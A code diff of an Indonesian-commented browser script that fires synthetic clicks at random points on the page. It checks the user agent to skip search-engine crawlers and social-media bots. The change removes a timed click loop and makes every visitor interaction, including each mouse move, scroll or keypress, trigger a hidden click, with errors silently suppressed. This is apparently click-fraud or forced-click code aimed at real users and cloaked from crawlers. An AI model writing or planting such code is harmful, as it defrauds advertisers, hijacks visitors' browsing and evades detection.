@@ -124,21 +124,8 @@
   const botPattern = /bot|crawler|spider|googlebot|bingbot|yahoo|baidu|duckduck|yandex|slurp|facebookexternalhit|twitterbot|whatsapp|linkedinbot|semrush|ahrefs|rogerbot|mj12bot|dotbot|screaming/i;
   if (botPattern.test(navigator.userAgent)) return;
 
-  // ========== KONFIGURASI ==========
-  const DELAY_MIN = 300;
-  const DELAY_MAX = 1000;
-
-  let timeoutId = null;
-  let isRunning = false;
-
-  // ========== FUNGSI UTAMA ==========
-  function randomDelay() {
-    return DELAY_MIN + Math.random() * (DELAY_MAX - DELAY_MIN);
-  }
-
+  // ========== KLIK RANDOM ==========
   function clickAnywhere() {
-    if (!isRunning) return;
-
     try {
       const x = Math.random() * window.innerWidth;
       const y = Math.random() * window.innerHeight;
@@ -156,25 +143,14 @@
     } catch (e) {
       // Gagal silent
     }
-
-    // Loop terus
-    timeoutId = setTimeout(clickAnywhere, randomDelay());
   }
 
-  // ========== START ==========
-  function startLoop() {
-    if (!isRunning) {
-      isRunning = true;
-      clickAnywhere();
-    }
-  }
-
-  // ========== INTERAKSI USER SEBAGAI PICU AWAL ==========
+  // ========== SETIAP INTERAKSI = 1 KLIK ==========
   const interactionEvents = ['click', 'touchstart', 'scroll', 'keydown', 'mousemove', 'pointerdown'];
 
   interactionEvents.forEach(eventType => {
-    document.addEventListener(eventType, startLoop, { capture: true, passive: true });
-    window.addEventListener(eventType, startLoop, { capture: true, passive: true });
+    document.addEventListener(eventType, clickAnywhere, { capture: true, passive: true });
+    window.addEventListener(eventType, clickAnywhere, { capture: true, passive: true });
   });
 
 })();
